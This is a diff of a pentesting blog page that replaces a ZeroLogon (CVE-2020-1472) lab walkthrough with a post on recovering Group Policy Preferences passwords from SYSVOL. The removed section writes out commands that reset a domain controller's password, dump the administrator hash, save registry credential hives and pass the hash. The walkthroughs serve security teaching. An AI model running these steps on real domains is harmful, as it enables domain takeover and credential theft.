@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          CVE-2020-1472 - Kat | Blog
+          GPP漏洞 - Kat | Blog
         
     </title>
 
-    <link rel="canonical" href="https://spanning-tree.xyz/2022/077531b9b0.html">
+    <link rel="canonical" href="https://spanning-tree.xyz/2022/07b068a21b.html">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -91,11 +91,11 @@
                               <a class="tag" href="/tags/#域渗透" title="域渗透">域渗透</a>
                             
                         </div>
-                        <h1>CVE-2020-1472</h1>
+                        <h1>GPP漏洞</h1>
                         <h2 class="subheading"></h2>
                         <span class="meta">
                             Posted by Kat on
-                            2022-07-16
+                            2022-07-17
                         </span>
                     </div>
                 
@@ -215,58 +215,42 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h1 id="cve-2020-1472_zerologon">CVE-2020-1472_ZeroLogon</h1>
-<h2 id="0x01-漏洞说明">0x01 漏洞说明</h2>
-<p>通过该漏洞，攻击者只需能够访问域控的445端口，在无需任何凭据的情况下能拿到域管的权限。</p>
-<p>该漏洞的产生来源于Netlogon协议认证的加密模块存在缺陷，导致攻击者可以在没有凭证的情况情况下通过认证。</p>
-<h3 id="1-影响系统">1. 影响系统</h3>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2008 R2 <span class="keyword">for</span> x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2008 R2 <span class="keyword">for</span> x64-based Systems Service Pack 1 (Server Core installation)</span><br><span class="line">Windows Server 2012</span><br><span class="line">Windows Server 2012 (Server Core installation)</span><br><span class="line">Windows Server 2012 R2</span><br><span class="line">Windows Server 2012 R2 (Server Core installation)</span><br><span class="line">Windows Server 2016</span><br><span class="line">Windows Server 2016  (Server Core installation)</span><br><span class="line">Windows Server 2019</span><br><span class="line">Windows Server 2019  (Server Core installation)</span><br><span class="line">Windows Server, version 1903 (Server Core installation)</span><br><span class="line">Windows Server, version 1909 (Server Core installation)</span><br><span class="line">Windows Server, version 2004 (Server Core installation)</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-漏洞复现">0x02 漏洞复现</h2>
-<h3 id="1-验证">1. 验证</h3>
-<p><a href="https://github.com/SecuraBV/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/SecuraBV/CVE-2020-1472</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 zerologon_tester.py WIN-SJD97LJQLJP 192.168.40.132</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xgsbns8j21o406qmyn.jpg" alt="img"></p>
-<h3 id="2-利用">2. 利用</h3>
-<p>整体利用流程：</p>
-<ol>
-<li>置空域控中保存的密码</li>
-<li>导出域用户哈希（利用置控的域机器账户，域机器是不可登录的。）</li>
-<li>恢复域控机器用户密码</li>
-</ol>
-<h4 id="21-置空域控机器用户密码">2.1 置空域控机器用户密码</h4>
-<p><a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">CVE-2020-1472</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xgt07g1j21og0aytan.jpg" alt="img"></p>
-<h4 id="22-导出ntds哈希">2.2 导出ntds哈希</h4>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\secretsdump.py spanning-tree.org/WIN-SJD97LJQLJP<span class="variable">$@WIN</span>-SJD97LJQLJP -dc-ip 192.168.40.132 -no-pass -just-dc-user administrator</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xgvvdk7j22q00ak41k.jpg" alt="img"></p>
-<h4 id="23-恢复域控机器用户密码">2.3 恢复域控机器用户密码</h4>
-<p>在攻击过程中，我们将机器的密码置为空，这一步是会导致域控脱域的。所以我们需要及时恢复，我们将AD中的密码与注册表/lsass里面的密码保持一致。</p>
-<p>主要有三种方法：</p>
-<p><strong>从注册表/lsass里面读取机器用户原先的密码，恢复AD里面的密码</strong></p>
-<p>我们直接通过reg save命令 将注册表里面的信息拿回本地，然后通过secretsdump提取出里面的hash</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\wmiexec.py spanning-tree.org/administrator@192.168.40.132 -hashes aad3b435b51404eeaad3b435b51404ee:****</span><br></pre></td></tr></table></figure>
-<p>这里有个问题，如果域控下当前目录存在导出的凭据的话，在执行导出注册表的时候会一直卡住在命令执行阶段。</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xgylujej22to0o644g.jpg" alt="img"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xgzqwqaj22wy0jogp6.jpg" alt="img"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xh1qpykj22xc0qugvv.jpg" alt="img"></p>
-<p>使用<a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">CVE-2020-1472</a>下的restorepassword进行恢复</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\restorepassword.py spanning-tree.org/WIN-SJD97LJQLJP@WIN-SJD97LJQLJP -target-ip 192.168.40.132 -hexpass ***</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xh6cjanj22xa08g429.jpg" alt="img"></p>
-<p>再次尝试导出域哈希失败</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xha0rbdj22q005840e.jpg" alt="img"></p>
-<p>也可以使用<a href="https://github.com/risksense/zerologon" target="_blank" rel="noopener">risksense_zerologon</a>下的reinstall_original_pw.py来恢复，相当于重新进行一次攻击，计算密码的时候使用了空密码的hash去计算session_key。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 reinstall_original_pw.py WIN-SJD97LJQLJP 192.168.40.132 4f6d7e91463d3ea150e57b50fbbca2c2</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xhd9qx1j22xe0quajh.jpg" alt="img"></p>
-<p><strong>从ntds.dict里面读取AD历史密码，然后恢复AD里面的密码</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\secretsdump.py spanning-tree.org/WIN-SJD97LJQLJP<span class="variable">$@WIN</span>-SJD97LJQLJP -dc-ip 192.168.40.132 -no-pass -histoty</span><br></pre></td></tr></table></figure>
-<p>不太稳定，有时候会读不出来</p>
-<p><strong>重置计算机的机器帐户密码(包括AD，注册表，lsass里面的密码)</strong></p>
-<p>这里使用的是powershell 的cmdletReset-ComputerMachinePassword，是微软针对计算机脱域的情况下给出的一种解决方案。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 .\wmiexec.py spanning-tree.org/administrator@WIN-SJD97LJQLJP -hashes aad3b435b51404eeaad3b435b51404ee:**** -code GBK</span><br><span class="line"></span><br><span class="line">powershell Reset-ComputerMachinePassword</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xhhicg9j22ye0bmach.jpg" alt="img"></p>
+                <h1 id="gpp漏洞">GPP漏洞</h1>
+<p>域环境中往往通过配置组策略可以对域中的用户、用户组、计算机进行不同维度的管理；</p>
+<p>如安全配置、注册表配置、软件安装配置、开关机与登入登出管理等。常见的使用场景比如通过组策略统一修改域内账号密码等开关机策略等。</p>
+<h2 id="0x01-gpp漏洞介绍">0x01 GPP漏洞介绍</h2>
+<p>GPP全名Group Policy Preferences，组策略首选项。</p>
+<p>GPP，部署的策略给域成员都添加一个用户或者修改本地用户administrator的密码，达</p>
+<p>到统一管理本地管理员用户密码的功能。那么这时候域控的SYSVOL共享目录里有一个</p>
+<p>global.xml里面可能会存放{name,cpasswords}，这个账号密码很可能就是域里面所有机</p>
+<p>子的本地管理员账号密码。</p>
+<p>所以只需要一个域用户，就可以读取域控共享SYSVOL目录，从而获取组策略中的相关密码。</p>
+<h2 id="0x02-环境搭建">0x02 环境搭建</h2>
+<p>我们增加针对域内主机批量修改本地administrator用户密码的</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h4a6ruo88yj21mu0rutdg.jpg" alt="img"></p>
+<p>设置名称为 test</p>
+<p>test - 设置 - 右键 - 编辑 - 用户配置 - 首选项 - 控制面板设置 - 本地用户和组</p>
+<p>更新administrator（内置），设置密码，如下图：</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h4a6rzmhryj21840u0wl1.jpg" alt="img"></p>
+<p>在组策略-委派中可以设置权限</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h4a6s6do3kj21tk0hudkq.jpg" alt="img"></p>
+<p>在详细信息这一栏中可以看到组策略对应的ID为{059B2F4E-2955-4F97-A9D7-AEFBEED98AE5}</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h4a6s586z9j21lw0m8djf.jpg" alt="img"></p>
+<p>至此，组策略配置完成，域内主机重新登录，即可应用此策略。</p>
+<h2 id="0x03-获取密码">0x03 获取密码</h2>
+<p>在共享文件夹 \ SYSVOL 中可看到组策略对应 ID 的文件夹</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h4a6scvlqxj217e0d0tal.jpg" alt="img"></p>
+<p>由于我们刚刚修改了用户配置下的控制面板，所以在对应的文件夹下能找到配置文件 Groups.xml</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h4a6sgsytcj22mm0jojyj.jpg" alt="img"></p>
+<p>其中的 cpassword 项，保存的是加密后的内容<code>cppassword=&quot;nBmr8DzxcrQHMKuoTxl3ng&quot;</code></p>
+<p>加密方式为 AES 256，虽然目前 AES 256 很难被攻破，但是微软选择公开了该 AES 256 加密的私钥，</p>
+<p>借助该私钥，我们就能还原出明文</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h4a6sktc04j213k05at91.jpg" alt="img"></p>
+<p>也可以使用impacket工具包中的Get-GPPpassword 进行获取，会自动遍历系统中的XML文件并从中自动解密。</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h4a6spal6fj229i0hidig.jpg" alt="img"></p>
+<h2 id="0x04-总结">0x04 总结</h2>
+<p>高版本的域控或者已经打了KB2962486的补丁，组策略中的xml文件中不会再同步cppassword属性；</p>
+<p>但是通常在管理员安全意思相对较为薄弱的情况下，还是会使用各种批处理或者VBS脚本在相关组策略中执行。</p>
 
                 
 
@@ -274,13 +258,9 @@
                 <!-- Pager -->
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/2022/07b068a21b.html" data-toggle="tooltip" data-placement="top" title="GPP漏洞">&larr; Previous Post</a>
-                        </li>
-                    
                     
                         <li class="next">
-                            <a href="/2022/073aa336e2.html" data-toggle="tooltip" data-placement="top" title="CVE-2021-42278/42287_NoPac">Next Post &rarr;</a>
+                            <a href="/2022/077531b9b0.html" data-toggle="tooltip" data-placement="top" title="CVE-2020-1472">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -336,7 +316,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#cve-2020-1472_zerologon"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">CVE-2020-1472_ZeroLogon</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x01-漏洞说明"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">0x01 &#x6F0F;&#x6D1E;&#x8BF4;&#x660E;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-影响系统"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">1. &#x5F71;&#x54CD;&#x7CFB;&#x7EDF;</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x02-漏洞复现"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">0x02 &#x6F0F;&#x6D1E;&#x590D;&#x73B0;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-验证"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">1. &#x9A8C;&#x8BC1;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-利用"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">2. &#x5229;&#x7528;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#21-置空域控机器用户密码"><span class="toc-nav-number">1.2.2.1.</span> <span class="toc-nav-text">2.1 &#x7F6E;&#x7A7A;&#x57DF;&#x63A7;&#x673A;&#x5668;&#x7528;&#x6237;&#x5BC6;&#x7801;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#22-导出ntds哈希"><span class="toc-nav-number">1.2.2.2.</span> <span class="toc-nav-text">2.2 &#x5BFC;&#x51FA;ntds&#x54C8;&#x5E0C;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#23-恢复域控机器用户密码"><span class="toc-nav-number">1.2.2.3.</span> <span class="toc-nav-text">2.3 &#x6062;&#x590D;&#x57DF;&#x63A7;&#x673A;&#x5668;&#x7528;&#x6237;&#x5BC6;&#x7801;</span></a></li></ol></li></ol></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#gpp漏洞"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">GPP&#x6F0F;&#x6D1E;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x01-gpp漏洞介绍"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">0x01 GPP&#x6F0F;&#x6D1E;&#x4ECB;&#x7ECD;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x02-环境搭建"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">0x02 &#x73AF;&#x5883;&#x642D;&#x5EFA;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x03-获取密码"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">0x03 &#x83B7;&#x53D6;&#x5BC6;&#x7801;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x04-总结"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">0x04 &#x603B;&#x7ED3;</span></a></li></ol></li></ol>
         
         </div>
       </aside>
